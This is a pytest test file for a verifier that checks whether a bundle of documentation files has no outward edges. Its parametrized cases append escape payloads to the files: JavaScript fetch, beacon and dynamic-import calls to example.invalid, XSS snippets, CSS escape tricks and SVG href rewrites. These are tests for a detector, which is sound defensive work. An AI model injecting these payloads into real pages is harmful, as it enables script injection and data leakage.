# Terminology: Extensible Markup Language (XML); line feed (LF); Protect the Software (PS).
from __future__ import annotations

from copy import deepcopy
import hashlib
import os
from pathlib import Path
import re
import shutil

import pytest

from verifier.runtime.namespace_contracts import namespace_registry, requirements_for
from verifier.runtime import (
    package_original_kind_catalog,
    package_semantic_review_package_object as review,
    package_source_contracts,
)


ROOT = Path(__file__).parents[1]
# PROTOCOL is UNRESOLVED: the browser asset has no serialized exchange or
# process/remote boundary, so its declarations and specialization are withheld.
# The five refutations are closure-gated: the real bytes carry declared external
# edges (build backend, dependencies, console scripts, pytest plugin options and
# outward documentation links), so none of them can be closed to DNE here.
EXPECTED_COUNTS = {
    "objects": 1,
    "paths": 9,
    "decisions": 12,
    "applies": 6,
    "does_not_apply": 0,
    "closure_gated_candidates": 5,
    "unresolved": 6,
    "declarations": 18,
    "declaration_fields": 73,
}
EXPECTED_UNRESOLVED = {"ASSET", "FINBOT", "LEDGER", "MARKET", "PROTOCOL", "ROBOT"}
EXPECTED_OPEN_PATHS = [
    "docs/guides.html",
    "docs/index.html",
    "docs/reference.html",
    "pyproject.toml",
]
EXPECTED_INVENTORY_DIGEST = (
    "36a192092fb36dd80e424abf8873abe9e3eaafc048a9715a5872904d4a36ad44"
)
KEEP_LOCAL_TARGETS = ("assets/site.css", "assets/vstd-overview.png", "assets/vstd-overview.svg")
CLOSED_PYPROJECT = '[project]\nname = "fixture"\nversion = "0"\n'
HTML_PAGES = ("docs/guides.html", "docs/index.html", "docs/reference.html")
JS_PATH = "docs/assets/orientation-previews.js"


def _digest(path: Path) -> str:
    return "sha256:" + hashlib.sha256(path.read_bytes()).hexdigest()


def _files(root: Path = ROOT) -> dict[str, str]:
    return {path: _digest(root / path) for path in review.PACKAGE_OBJECT_PATHS}


def _row() -> dict:
    return {
        "object_id": review.PACKAGE_OBJECT_ID,
        "kind": "OBJECT",
        "specializations": ["POLICY"],
        "operands": {},
        "surfaces": [
            *["file:" + path for path in review.PACKAGE_OBJECT_PATHS],
            "module:verifier",
            "route:vstd",
        ],
        "classification": {},
        "obligations": {},
    }


def _rows() -> dict[str, dict]:
    return {review.PACKAGE_OBJECT_ID: _row()}


def _requirements() -> dict[str, dict[str, tuple[str, ...]]]:
    registry = namespace_registry()
    return {
        kind: {
            item["id"]: tuple(item["declaration_fields"])
            for item in requirements_for(registry, (kind,))
            if item["kind"] == kind
        }
        for kind in review.REVIEW_KINDS
    }


def _sha256(lines: list[str]) -> str:
    return hashlib.sha256("\n".join(lines).encode("utf-8")).hexdigest()


def _localize(text: str) -> str:
    """Rewrite every outward or unowned reference to an in-page fragment."""

    def replace(match: re.Match[str]) -> str:
        value = match.group(2)
        keep = value in KEEP_LOCAL_TARGETS or value.startswith("#")
        return match.group(1) + '"' + (value if keep else "#") + '"'

    return re.sub(r'((?:href|src)=)"([^"]*)"', replace, text)


def _closed_root(tmp_path: Path) -> Path:
    """Copy the nine exact files into a root whose closure is closed."""
    root = tmp_path / "closed"
    for path in review.PACKAGE_OBJECT_PATHS:
        (root / path).parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT / path, root / path)
    for page in HTML_PAGES:
        target = root / page
        target.write_text(_localize(target.read_text(encoding="utf-8")), encoding="utf-8")
    (root / "pyproject.toml").write_bytes(CLOSED_PYPROJECT.encode("utf-8"))
    return root


def _append(root: Path, path: str, addition: str) -> None:
    target = root / path
    target.write_text(target.read_text(encoding="utf-8") + addition, encoding="utf-8")


@pytest.fixture
def closed_pyproject(monkeypatch: pytest.MonkeyPatch) -> None:
    """Stipulate that the fixture's exact pyproject bytes close, to reach DNE.

    The production pyproject rule never closes: a missing or present
    [build-system] reaches an external PEP 518 backend.  The stipulation applies
    only to CLOSED_PYPROJECT, so the refutation machinery is exercised on closed
    bytes without claiming that any real pyproject.toml closes.
    """
    original = review._pyproject_open_edges
    monkeypatch.setattr(
        review,
        "_pyproject_open_edges",
        lambda text: [] if text == CLOSED_PYPROJECT else original(text),
    )


def _refuted_statuses(selected: dict) -> dict[str, str]:
    return {
        kind: selected["classification"][kind]["status"] for kind in review.REFUTED_KINDS
    }


def test_review_document_is_complete_deterministic_and_digest_free() -> None:
    first = review.review_document()
    second = review.review_document()
    assert first == second
    assert first is not second
    assert review.review_counts() == EXPECTED_COUNTS
    assert tuple(first) == (review.PACKAGE_OBJECT_ID,)

    item = first[review.PACKAGE_OBJECT_ID]
    assert item["primary_kind"] == "OBJECT"
    assert item["owned_paths"] == list(review.PACKAGE_OBJECT_PATHS)
    assert set(item["classification"]) == set(review.REVIEW_KINDS)
    assert {
        kind
        for kind, decision in item["classification"].items()
        if decision["status"] == "APPLIES"
    } == set(review.APPLICABLE_KINDS)
    # Without bytes no closure can be witnessed, so no refutation is claimed.
    assert {
        kind
        for kind, decision in item["classification"].items()
        if decision["status"] == "DOES_NOT_APPLY"
    } == set()
    assert {
        kind
        for kind, decision in item["classification"].items()
        if decision["status"] == "UNRESOLVED"
    } == EXPECTED_UNRESOLVED
    assert "sha256:" not in repr(item)

    contracts = _requirements()
    expected_obligations = {
        obligation_id: fields
        for kind in review.APPLICABLE_KINDS
        for obligation_id, fields in contracts[kind].items()
    }
    assert set(item["declarations"]) == set(expected_obligations)
    for kind, decision in item["classification"].items():
        assert decision["reason"].strip()
        assert decision["evidence_paths"] == (
            list(review.ROLE_PATHS[kind]) if kind in review.APPLICABLE_KINDS else []
        )
    for obligation_id, declaration in item["declarations"].items():
        assert set(declaration) == set(expected_obligations[obligation_id])
        assert all(value.strip() and len(value) <= 8192 for value in declaration.values())

    first[review.PACKAGE_OBJECT_ID]["declarations"].clear()
    assert review.review_document() == second


def test_exact_final_path_and_source_inventory_is_pinned() -> None:
    paths: list[str] = list(review.PACKAGE_OBJECT_PATHS)
    assert len(paths) == len(set(paths)) == review.MAX_PACKAGE_OBJECT_PATHS == 9
    assert paths == sorted(paths)
    assert all((ROOT / path).is_file() for path in paths)
    assert _sha256(paths) == review.PACKAGE_OBJECT_PATH_DIGEST

    inventory = []
    total = 0
    for path in paths:
        raw = (ROOT / path).read_bytes()
        total += len(raw)
        inventory.append(
            f"{path}\t{len(raw)}\t{hashlib.sha256(raw).hexdigest()}"
        )
    assert total == 446_994
    assert total < review.MAX_PACKAGE_OBJECT_SOURCE_BYTES
    assert _sha256(inventory) == EXPECTED_INVENTORY_DIGEST


def test_source_adapter_composes_full_ownership_with_scoped_consequence_review() -> None:
    original = package_original_kind_catalog.review_document()[
        review.PACKAGE_OBJECT_ID
    ]
    installed = package_source_contracts._INSTALLED_REVIEWS[
        review.PACKAGE_OBJECT_ID
    ]
    assert tuple(installed["owned_paths"]) == tuple(
        original["expected_owned_paths"]
    )
    assert tuple(installed["classification_scope_paths"]) == (
        review.PACKAGE_OBJECT_PATHS
    )


def test_browser_vocabulary_is_pinned_to_the_exact_current_asset() -> None:
    text = (ROOT / JS_PATH).read_text(encoding="utf-8")
    identifiers, pairs, violations = review._js_members(text)
    assert violations == []
    assert identifiers == review._JS_VOCABULARY
    assert pairs == review._JS_MEMBER_PAIRS
    assert not (review._JS_VOCABULARY & review._FORBIDDEN_JS_NAMES)


def test_closure_on_real_bytes_is_open_through_declared_external_edges() -> None:
    witness = review.closure_witness(ROOT)
    assert witness["closed"] is False
    assert witness["open_paths"] == EXPECTED_OPEN_PATHS
    pyproject_edges = [item for item in witness["open_edges"] if item.startswith("pyproject.toml:")]
    assert any("build backend" in item for item in pyproject_edges)
    assert any("project.scripts external edge" in item for item in pyproject_edges)
    # The browser asset itself is closed; its vocabulary is not what opens the witness.
    assert not any(item.startswith(JS_PATH + ":") for item in witness["open_edges"])


def test_apply_on_current_bytes_keeps_refutations_unresolved_with_open_witness() -> None:
    files = _files()
    rows = _rows()
    original = deepcopy(rows)
    result = review.apply_package_semantic_review_package_object(ROOT, rows, files)
    assert rows == original
    assert result is not rows

    selected = result[review.PACKAGE_OBJECT_ID]
    assert set(selected["specializations"]) == set(review.APPLICABLE_KINDS)
    assert set(selected["classification"]) == set(review.REVIEW_KINDS)
    for kind, decision in selected["classification"].items():
        if kind in review.APPLICABLE_KINDS:
            assert decision["status"] == "APPLIES"
            paths = review.ROLE_PATHS[kind]
        elif kind in review.REFUTED_KINDS:
            assert decision["status"] == "UNRESOLVED"
            assert decision["reason"] == review._unresolved_reason(kind)
            paths = tuple(EXPECTED_OPEN_PATHS)
        else:
            assert decision["status"] == "UNRESOLVED"
            assert decision["reason"] == review._unresolved_reason(kind)
            paths = ()
        assert decision["evidence"] == [
            {"path": path, "sha256": files[path]} for path in paths
        ]


def test_apply_populates_role_specific_evidence_and_declarations() -> None:
    files = _files()
    result = review.apply_package_semantic_review_package_object(ROOT, _rows(), files)
    selected = result[review.PACKAGE_OBJECT_ID]
    contracts = _requirements()
    expected = {
        obligation_id: fields
        for kind in review.APPLICABLE_KINDS
        for obligation_id, fields in contracts[kind].items()
    }
    assert set(selected["obligations"]) == set(expected)
    assert sum(
        len(binding["declaration"]) for binding in selected["obligations"].values()
    ) == EXPECTED_COUNTS["declaration_fields"]
    for obligation_id, binding in selected["obligations"].items():
        kind = obligation_id.split("-", 1)[0]
        assert binding["reason"].strip()
        assert "remain unestablished" in binding["reason"]
        assert set(binding["declaration"]) == set(expected[obligation_id])
        assert all(value.strip() for value in binding["declaration"].values())
        assert binding["evidence"] == [
            {"path": path, "sha256": files[path]} for path in review.ROLE_PATHS[kind]
        ]


@pytest.mark.usefixtures("closed_pyproject")
def test_closed_root_establishes_each_refutation_only_by_closure(tmp_path: Path) -> None:
    root = _closed_root(tmp_path)
    witness = review.closure_witness(root)
    assert witness == {"closed": True, "open_edges": [], "open_paths": []}

    result = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )
    selected = result[review.PACKAGE_OBJECT_ID]
    assert _refuted_statuses(selected) == {kind: "DOES_NOT_APPLY" for kind in review.REFUTED_KINDS}
    for kind in review.REFUTED_KINDS:
        decision = selected["classification"][kind]
        assert decision["reason"] == review._REASONS[kind]
        assert [item["path"] for item in decision["evidence"]] == list(review.PACKAGE_OBJECT_PATHS)
        assert not any(
            obligation_id.startswith(kind + "-") for obligation_id in selected["obligations"]
        )
    assert selected["classification"]["PROTOCOL"]["status"] == "UNRESOLVED"


@pytest.mark.usefixtures("closed_pyproject")
def test_referent_text_cannot_open_or_establish_a_closure(tmp_path: Path) -> None:
    root = _closed_root(tmp_path)
    _append(root, "docs/reference.html", "<p>Ledger order payment fetch balance market</p>")
    _append(root, "docs/assets/site.css", "\n.note { order: 2; }\n")
    assert review.closure_witness(root)["closed"] is True
    result = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )
    assert _refuted_statuses(result[review.PACKAGE_OBJECT_ID]) == {
        kind: "DOES_NOT_APPLY" for kind in review.REFUTED_KINDS
    }


ESCAPES_IN_BROWSER_ASSET = [
    ("dynamic-import", "\nimport('https://example.invalid/x.js');\n"),
    ("computed-window-key", "\nwindow['fe' + 'tch']('https://example.invalid');\n"),
    ("string-timer-callback", "\nsetTimeout(\"fetch('https://example.invalid')\", 0);\n"),
    ("function-constructor", "\nnew Function('return 1')();\n"),
    ("direct-eval", "\neval('1');\n"),
    ("reflection", "\nReflect.get(window, 'fetch');\n"),
    ("global-object", "\nglobalThis.fetch('https://example.invalid');\n"),
    ("network-fetch", "\nfetch('https://example.invalid');\n"),
    ("beacon", "\nnavigator.sendBeacon('https://example.invalid', 'x');\n"),
    ("storage", "\nlocalStorage.setItem('k', 'v');\n"),
    ("cookie", "\ndocument.cookie = 'a=b';\n"),
    ("log", "\nconsole.log('x');\n"),
    ("worker-process", "\nnew Worker('x.js');\n"),
    ("filesystem-reader", "\nnew FileReader();\n"),
    ("indexed-db", "\nindexedDB.open('x');\n"),
    ("device-serial", "\nnavigator.serial.requestPort();\n"),
    ("window-top-navigation", "\nwindow.top.location = 'https://example.invalid';\n"),
    ("event-property-callback", "\nlink.onclick = () => 1;\n"),
    ("template-interpolation", "\nconst t = `${fetch('https://example.invalid')}`;\n"),
    ("call-result-member", "\n(window).open('https://example.invalid');\n"),
]

STATIC_ESCAPES = [
    ("inline-script", "docs/guides.html", "\n<script>alert(1)</script>\n"),
    ("event-handler", "docs/index.html", '\n<a href="#" onclick="alert(1)">x</a>\n'),
    ("nested-container", "docs/reference.html", '\n<iframe src="assets/site.css"></iframe>\n'),
    ("meta-refresh", "docs/guides.html", '\n<meta http-equiv="refresh" content="0;url=x">\n'),
    ("javascript-url", "docs/index.html", '\n<a href="javascript:alert(1)">x</a>\n'),
    ("entity-encoded-scheme", "docs/index.html", '\n<a href="java&#x73;cript:alert(1)">x</a>\n'),
    ("unowned-script-source", "docs/index.html", '\n<script src="assets/other.js"></script>\n'),
    ("css-import", "docs/assets/site.css", "\n@import url(x.css);\n"),
    ("css-external-url", "docs/assets/site.css", "\nbody { background: url(https://example.invalid/a.png); }\n"),
    ("svg-script", "docs/assets/vstd-overview.svg", "\n<script>alert(1)</script>\n"),
    ("console-script-edge", "pyproject.toml", '\n[project.scripts]\nescape = "verifier.runtime.public_cli:main"\n'),
    ("pytest-plugin-option", "pyproject.toml", '\n[tool.pytest.ini_options]\naddopts = "-p evil"\n'),
]


@pytest.mark.usefixtures("closed_pyproject")
@pytest.mark.parametrize(("name", "addition"), ESCAPES_IN_BROWSER_ASSET)
def test_browser_asset_escape_reopens_closure_and_refuses_dne(
    tmp_path: Path, name: str, addition: str
) -> None:
    root = _closed_root(tmp_path)
    _append(root, JS_PATH, addition)
    witness = review.closure_witness(root)
    assert witness["closed"] is False, name
    assert witness["open_paths"] == [JS_PATH]
    result = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )
    selected = result[review.PACKAGE_OBJECT_ID]
    assert _refuted_statuses(selected) == {kind: "UNRESOLVED" for kind in review.REFUTED_KINDS}
    for kind in review.REFUTED_KINDS:
        assert [item["path"] for item in selected["classification"][kind]["evidence"]] == [JS_PATH]


@pytest.mark.usefixtures("closed_pyproject")
@pytest.mark.parametrize(("path", "addition"), [(p, a) for _, p, a in STATIC_ESCAPES], ids=[n for n, _, _ in STATIC_ESCAPES])
def test_static_and_policy_escape_reopens_closure_at_its_source(
    tmp_path: Path, path: str, addition: str
) -> None:
    root = _closed_root(tmp_path)
    _append(root, path, addition)
    witness = review.closure_witness(root)
    assert witness["closed"] is False
    assert witness["open_paths"] == [path]
    result = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )
    selected = result[review.PACKAGE_OBJECT_ID]
    assert _refuted_statuses(selected) == {kind: "UNRESOLVED" for kind in review.REFUTED_KINDS}
    for kind in review.REFUTED_KINDS:
        assert [item["path"] for item in selected["classification"][kind]["evidence"]] == [path]


@pytest.mark.parametrize(
    ("path", "content"),
    [
        ("docs/assets/vstd-overview.png", b"not a png"),
        ("src/verifier/hardware/accelerator_registry.json", b"{not json"),
    ],
)
@pytest.mark.usefixtures("closed_pyproject")
def test_binary_or_data_substitution_reopens_closure(
    tmp_path: Path, path: str, content: bytes
) -> None:
    root = _closed_root(tmp_path)
    (root / path).write_bytes(content)
    assert review.closure_witness(root)["open_paths"] == [path]


@pytest.mark.usefixtures("closed_pyproject")
def test_unlisted_or_missing_refutation_is_never_complement_inferred(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Even on a closed root, dropping a literal refutation must not infer DNE from
    # the complement of the remaining refutations or applicable roles.
    root = _closed_root(tmp_path)
    monkeypatch.setattr(
        review,
        "REFUTED_KINDS",
        tuple(kind for kind in review.REFUTED_KINDS if kind != "ROBOT"),
    )
    result = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )
    selected = result[review.PACKAGE_OBJECT_ID]
    assert selected["classification"]["ROBOT"] == {
        "status": "UNRESOLVED",
        "reason": review._unresolved_reason("ROBOT"),
        "evidence": [],
    }
    assert selected["classification"]["FINBOT"]["status"] == "DOES_NOT_APPLY"


def test_refutation_candidate_outside_open_witness_is_refused() -> None:
    # A closure-gated refutation's candidate evidence must be the open-edge witness,
    # not any owned file a caller prefers; the browser asset is closed here, so
    # naming it as the LEDGER candidate is a referent confusion and must be refused.
    files = _files()
    rows = review.apply_package_semantic_review_package_object(ROOT, _rows(), files)
    selected = rows[review.PACKAGE_OBJECT_ID]
    selected["classification"]["LEDGER"]["evidence"] = [
        {"path": JS_PATH, "sha256": files[JS_PATH]}
    ]
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_DECISION_CONFLICT"):
        review.apply_package_semantic_review_package_object(ROOT, rows, files)


def test_unknown_object_is_never_reviewed_or_refuted() -> None:
    rows = _rows()
    rows["unknown-future-owner"] = {
        "object_id": "unknown-future-owner",
        "kind": "OBJECT",
        "specializations": [],
        "surfaces": [],
        "classification": {
            "LEDGER": {
                "status": "UNRESOLVED",
                "reason": "No audited basis exists.",
                "evidence": [],
            }
        },
        "obligations": {},
    }
    result = review.apply_package_semantic_review_package_object(ROOT, rows, _files())
    assert result["unknown-future-owner"] == rows["unknown-future-owner"]
    assert set(result) == {review.PACKAGE_OBJECT_ID, "unknown-future-owner"}


def test_refutation_reasons_cite_owned_source_and_are_distinct() -> None:
    names = [Path(path).name for path in review.PACKAGE_OBJECT_PATHS]
    reasons = {kind: review._REASONS[kind] for kind in review.REFUTED_KINDS}
    for kind, reason in reasons.items():
        assert " does not apply as " + kind + ":" in reason
        assert any(name in reason for name in names), kind
    assert len(set(reasons.values())) == len(review.REFUTED_KINDS)
    assert "PROTOCOL" not in review._REASONS


def test_refutation_reasons_do_not_rest_on_prose_absence_over_the_nine_files() -> None:
    # The superseded reasons asserted that no file "contains" a term; that is a
    # lexical absence claim, which cannot prove DNE.  Reasons now name a closure.
    for kind in review.REFUTED_KINDS:
        reason = review._REASONS[kind]
        assert "no one of the nine files" not in reason
        assert "none of the nine files" not in reason
        assert "closure witness" in reason


@pytest.mark.parametrize(
    "failure",
    [
        "stale_census",
        "tampered_decision",
        "refutation_reason_substitution",
        "refutation_reason_without_evidence",
        "refutation_evidence_outside_witness",
        "refutation_partial_witness",
        "obligation_reason_substitution",
        "partial_declaration",
        "refuted_label",
        "refuted_declaration",
        "ownership",
        "stale_applies_unresolved",
        "stale_refutes_unresolved",
        "unresolved_label",
        "stale_dne_on_open_bytes",
    ],
)
def test_apply_rejects_stale_tampered_partial_and_refuted_state_atomically(
    failure: str,
) -> None:
    files = _files()
    rows = review.apply_package_semantic_review_package_object(
        ROOT, _rows(), files
    )
    selected = rows[review.PACKAGE_OBJECT_ID]
    if failure == "stale_applies_unresolved":
        # PROTOCOL was applied by an older catalog; a complete row must not be erased.
        selected["classification"]["PROTOCOL"] = {
            "status": "APPLIES",
            "reason": "Stale superseded protocol application.",
            "evidence": deepcopy(selected["classification"]["TRANSACTION"]["evidence"]),
        }
    elif failure == "stale_refutes_unresolved":
        selected["classification"]["PROTOCOL"] = {
            "status": "DOES_NOT_APPLY",
            "reason": "Stale superseded protocol refutation.",
            "evidence": deepcopy(selected["classification"]["LEDGER"]["evidence"]),
        }
    elif failure == "stale_dne_on_open_bytes":
        # An existing complete refutation that the open witness cannot re-establish.
        selected["classification"]["ROBOT"] = {
            "status": "DOES_NOT_APPLY",
            "reason": review._REASONS["ROBOT"],
            "evidence": [
                {"path": path, "sha256": files[path]}
                for path in review.PACKAGE_OBJECT_PATHS
            ],
        }
    elif failure == "unresolved_label":
        selected["specializations"].append("PROTOCOL")
    elif failure == "stale_census":
        files[review.PACKAGE_OBJECT_PATHS[0]] = "sha256:" + "0" * 64
    elif failure == "tampered_decision":
        selected["classification"]["CONTROLLER"]["status"] = "DOES_NOT_APPLY"
    elif failure == "refutation_reason_substitution":
        selected["classification"]["FINBOT"]["reason"] = selected[
            "classification"
        ]["ASSET"]["reason"]
    elif failure == "refutation_reason_without_evidence":
        # Empty candidate evidence must not let a substituted canonical reason pass.
        selected["classification"]["FINBOT"]["evidence"] = []
        selected["classification"]["FINBOT"]["reason"] = "Substituted FINBOT basis."
    elif failure == "refutation_evidence_outside_witness":
        selected["classification"]["FINBOT"]["evidence"] = [
            {"path": JS_PATH, "sha256": files[JS_PATH]}
        ]
    elif failure == "refutation_partial_witness":
        selected["classification"]["FINBOT"]["evidence"].pop()
    elif failure == "obligation_reason_substitution":
        selected["obligations"]["CONTROLLER-0.1-feedback-and-authority"][
            "reason"
        ] = "Substituted noncanonical obligation reason."
    elif failure == "partial_declaration":
        selected["obligations"]["POLICY-0.1-rules-and-precedence"][
            "declaration"
        ]["scope"] = ""
    elif failure == "refuted_label":
        selected["specializations"].append("ASSET")
    elif failure == "refuted_declaration":
        selected["obligations"]["ASSET-0.1-identity-and-quantity"] = {
            "reason": "A contradictory asserted ASSET declaration.",
            "evidence": deepcopy(selected["classification"]["ASSET"]["evidence"]),
            "declaration": {
                field: "Contradictory value for " + field + "."
                for field in _requirements()["ASSET"][
                    "ASSET-0.1-identity-and-quantity"
                ]
            },
        }
    elif failure == "ownership":
        selected["surfaces"].remove("file:" + review.PACKAGE_OBJECT_PATHS[-1])
    else:
        raise AssertionError("unknown failure " + failure)
    before = deepcopy(rows)
    with pytest.raises(ValueError, match="PACKAGE_(?:OBJECT|SEMANTIC)_REVIEW_"):
        review.apply_package_semantic_review_package_object(ROOT, rows, files)
    assert rows == before


def test_apply_is_idempotent_and_rejects_reason_substitution() -> None:
    files = _files()
    first = review.apply_package_semantic_review_package_object(ROOT, _rows(), files)
    second = review.apply_package_semantic_review_package_object(ROOT, first, files)
    assert second == first
    assert review.apply_package_semantic_review_package_object(ROOT, second, files) == second

    first[review.PACKAGE_OBJECT_ID]["classification"]["FINBOT"]["reason"] = (
        "Substituted noncanonical FINBOT refutation."
    )
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_DECISION_CONFLICT"):
        review.apply_package_semantic_review_package_object(ROOT, first, files)


@pytest.mark.usefixtures("closed_pyproject")
def test_closed_root_apply_is_idempotent_over_its_own_output(tmp_path: Path) -> None:
    root = _closed_root(tmp_path)
    files = _files(root)
    first = review.apply_package_semantic_review_package_object(root, _rows(), files)
    second = review.apply_package_semantic_review_package_object(root, first, files)
    assert second == first


def test_root_role_metadata_does_not_substitute_for_object_refinements() -> None:
    files = _files()
    rows = _rows()
    selected = rows[review.PACKAGE_OBJECT_ID]
    selected["root_role_decisions"] = [
        {
            "root_kind": "DATA",
            "status": "APPLIES",
            "reason": "Separate retained-root composition metadata.",
        }
    ]
    result = review.apply_package_semantic_review_package_object(ROOT, rows, files)
    assert result[review.PACKAGE_OBJECT_ID]["root_role_decisions"] == selected[
        "root_role_decisions"
    ]
    assert set(result[review.PACKAGE_OBJECT_ID]["classification"]) == set(
        review.REVIEW_KINDS
    )


@pytest.mark.parametrize(
    "alias",
    ["docs/ASSETS/site.css", "docs/assets/./site.css", "docs/assets/../assets/site.css"],
)
def test_source_snapshot_refuses_non_canonical_spellings(alias: str) -> None:
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_SOURCE_UNAVAILABLE"):
        review._source_snapshot(ROOT.resolve(), (alias,))


def test_hard_linked_source_alias_is_refused(tmp_path: Path) -> None:
    root = _closed_root(tmp_path)
    outside = tmp_path / "outside-site.css"
    outside.write_bytes((root / "docs/assets/site.css").read_bytes())
    target = root / "docs/assets/site.css"
    target.unlink()
    try:
        os.link(outside, target)
    except OSError as exc:
        pytest.skip("OS_CAPABILITY_GUARD: hard-link creation (os.link) unavailable: " + str(exc))
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_SOURCE_UNAVAILABLE"):
        review.apply_package_semantic_review_package_object(root, _rows(), _files(root))


def test_symlinked_source_outside_root_is_refused(tmp_path: Path) -> None:
    root = _closed_root(tmp_path)
    outside = tmp_path / "outside-site.css"
    outside.write_bytes((root / "docs/assets/site.css").read_bytes())
    target = root / "docs/assets/site.css"
    target.unlink()
    try:
        os.symlink(outside, target)
    except OSError as exc:
        pytest.skip("OS_CAPABILITY_GUARD: symbolic-link creation (os.symlink) unavailable: " + str(exc))
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_SOURCE_UNAVAILABLE"):
        review.apply_package_semantic_review_package_object(root, _rows(), _files(root))


def test_apply_rejects_concurrent_source_drift_before_copy_mutation(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    files = _files()
    rows = _rows()
    before = deepcopy(rows)
    original = review._source_snapshot
    calls = 0

    def changed_source(
        root: Path, paths: tuple[str, ...]
    ) -> tuple[list[dict[str, str]], int, dict[str, bytes]]:
        nonlocal calls
        calls += 1
        evidence, total, raw = original(root, paths)
        if calls == 2:
            evidence[0] = {
                "path": evidence[0]["path"],
                "sha256": "sha256:" + "f" * 64,
            }
        return evidence, total, raw

    monkeypatch.setattr(review, "_source_snapshot", changed_source)
    with pytest.raises(ValueError, match="PACKAGE_OBJECT_REVIEW_SOURCE_CHANGED"):
        review.apply_package_semantic_review_package_object(ROOT, rows, files)
    assert rows == before


# Each counterexample is written onto one owned source and must open the witness
# at that source for its intended reason.  The marker is a substring of the open
# edge, so a case that opens for an unrelated reason does not pass.
OWNED_SOURCE_COUNTEREXAMPLES = [
    # C1: a line comment ends only at LF in the lexer; JS also ends it at CR, LS, PS.
    ("c1-cr-ends-line-comment", JS_PATH, "append", b'\n// note\rfetch("https://example.invalid/cr")\n', "identifier fetch"),
    ("c1-ls-ends-line-comment", JS_PATH, "append", '\n// note fetch("https://example.invalid/ls")\n'.encode("utf-8"), "identifier fetch"),
    ("c1-ps-ends-line-comment", JS_PATH, "append", '\n// note fetch("https://example.invalid/ps")\n'.encode("utf-8"), "identifier fetch"),
    # C2-C3: a slash that may start a regex literal cannot be guessed as a comment.
    ("c2-regex-class-double-slash", JS_PATH, "append", b'\nconst link = /[//]/; fetch("https://example.invalid/re");\n', "regex-ambiguous"),
    ("c3-regex-class-block-comment", JS_PATH, "append", b'\nconst link = /[/*]/; fetch("https://example.invalid/bc"); /* end */\n', "regex-ambiguous"),
    ("c3-regex-quote-string", JS_PATH, "append", b"\nconst link = /'/; fetch(\"https://example.invalid/q\"); const text = '';\n", "regex-ambiguous"),
    # C4-C6: string-carried sinks through vocabulary-preserving calls.
    ("c4-created-script-src", JS_PATH, "append", b'\nconst loader = document.createElement("script");\nloader.setAttribute("src", "https://example.invalid/x.js");\ndocument.body.append(loader);\n', "createElement argument outside allowlist"),
    ("c4-card-src-attribute", JS_PATH, "append", b'\ncard.setAttribute("src", "https://example.invalid/x.js");\n', "setAttribute argument outside allowlist"),
    ("c5-created-script-text", JS_PATH, "append", b'\nconst element = document.createElement("script");\nelement.textContent = "fetch(\'https://example.invalid/t\')";\ndocument.body.append(element);\n', "createElement argument outside allowlist"),
    ("c5-text-element-script-tag", JS_PATH, "append", b'\nconst node = textElement("script", "x", "fetch(\'https://example.invalid/tt\')");\n', "textElement argument outside allowlist"),
    ("c6-timer-dataset-string", JS_PATH, "append", b'\nconst link = document.querySelectorAll("a");\nsetTimeout(link.dataset.orientationDefinition, 0);\n', "timer callback is not a literal arrow function"),
    ("c6-timer-identifier", JS_PATH, "append", b"\nsetTimeout(show, 0);\n", "timer callback is not a literal arrow function"),
    ("alias-bare-create-element", JS_PATH, "append", b'\nconst element = document.createElement;\nelement("script");\n', "bare reference to createElement"),
    ("html-comment-hides-block", JS_PATH, "append", b'\n<!-- /*\nfetch("https://example.invalid/h"); const s = "*/";\n', "HTML-like comment"),
    ("template-comment-interpolation", JS_PATH, "append", b'\nconst s = `//${fetch("https://example.invalid/t")}`;\n', "comment-like text in template literal"),
    ("numeric-member-chain", JS_PATH, "append", b"\nconst c = 1..constructor;\n", "member access on a non-identifier"),
    ("unterminated-string-cr", JS_PATH, "append", b"\nconst s = '\rfetch(1)';\n", "unterminated string or template literal"),
    # C7-C9: CSS escapes and string-valued references.
    ("c7-escaped-url", "docs/assets/site.css", "append", b'\nbody { background: u\\72l("https://example.invalid/a.png"); }\n', "CSS backslash escape"),
    ("c8-escaped-import", "docs/assets/site.css", "prepend", b'@\\69mport "https://example.invalid/x.css";\n', "CSS backslash escape"),
    ("c9-image-set-string", "docs/assets/site.css", "append", b'\nbody { background-image: image-set("https://example.invalid/b.png" 1x); }\n', "CSS string reference outside an owned source"),
    ("c9-cross-fade-string", "docs/assets/site.css", "append", b'\nbody { background-image: cross-fade("https://example.invalid/c.png", red); }\n', "CSS string reference outside an owned source"),
    ("c9-src-string", "docs/assets/site.css", "append", b'\nbody { background: src("https://example.invalid/d.png"); }\n', "CSS string reference outside an owned source"),
    ("c9-style-element-image-set", "docs/guides.html", "append", b'\n<style>body { background: image-set("https://example.invalid/h.png" 1x); }</style>\n', "CSS string reference outside an owned source"),
    ("style-attribute-escape", "docs/index.html", "append", b'\n<div style="background: u\\72l(x.png)">x</div>\n', "CSS backslash escape"),
    # An unclosed style element and an unquoted style attribute are CSS regions too.
    ("unclosed-style-element-image-set", "docs/reference.html", "append", b'\n<style>body { background: image-set("https://example.invalid/u.png" 1x); }\n', "CSS string reference outside an owned source"),
    ("unquoted-style-attribute-escape", "docs/index.html", "append", b'\n<div style=u\\72l(x.png)>x</div>\n', "CSS backslash escape"),
    # C13: SVG animation can rewrite href or navigation targets.
    ("c13-svg-animate-href", "docs/assets/vstd-overview.svg", "append", b'\n<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" to="https://example.invalid/" fill="freeze"/></a></svg>\n', "SVG animation element"),
    ("c13-svg-set-href", "docs/assets/vstd-overview.svg", "append", b'\n<set attributeName="href" to="https://example.invalid/"/>\n', "SVG animation element"),
    ("svg-namespaced-inline-script", "docs/assets/vstd-overview.svg", "append", b'\n<s:script xmlns:s="http://www.w3.org/2000/svg">fetch(1)</s:script>\n', "script edge outside the owned executable asset"),
